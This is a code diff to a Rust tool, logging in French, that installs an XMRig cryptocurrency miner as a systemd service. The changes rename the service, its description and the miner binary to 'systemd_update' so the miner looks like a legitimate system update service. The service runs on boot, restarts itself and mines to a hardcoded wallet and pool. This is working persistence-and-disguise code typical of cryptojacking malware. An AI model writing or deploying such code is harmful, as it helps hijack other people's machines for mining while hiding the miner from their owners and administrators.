@@ -85,12 +85,12 @@ async fn create_systemd_service() -> Result<(), Box<dyn Error>> {
     println!("[+] Génération du service systemd pour xmrig");
     let service_content = format!(
         "[Unit]
-Description=XMRig Miner Service
+Description=systemd_update
 After=network.target
 
 [Service]
 Type=simple
-ExecStart={build}/xmrig -o {pool} -u {wallet} -k --rig-id {worker}
+ExecStart={build}/systemd_update -o {pool} -u {wallet} -k --rig-id {worker}
 Restart=always
 RestartSec=5
 
@@ -102,14 +102,14 @@ WantedBy=multi-user.target
         wallet = XMR_WALLET,
         worker = WORKER_NAME
     );
-    write("/etc/systemd/system/xmrig.service", service_content)?;
+    write("/etc/systemd/system/systemd_update.service", service_content)?;
     Ok(())
 }
 
 async fn start_systemd_service() -> Result<(), Box<dyn Error>> {
-    println!("[+] Activation et démarrage du service xmrig");
+    println!("[+] Activation et démarrage du service systemd_update");
     run_cmd("systemctl daemon-reload").await?;
-    run_cmd("systemctl enable xmrig").await?;
-    run_cmd("systemctl start xmrig").await?;
+    run_cmd("systemctl enable systemd_update").await?;
+    run_cmd("systemctl start systemd_update").await?;
     Ok(())
 }
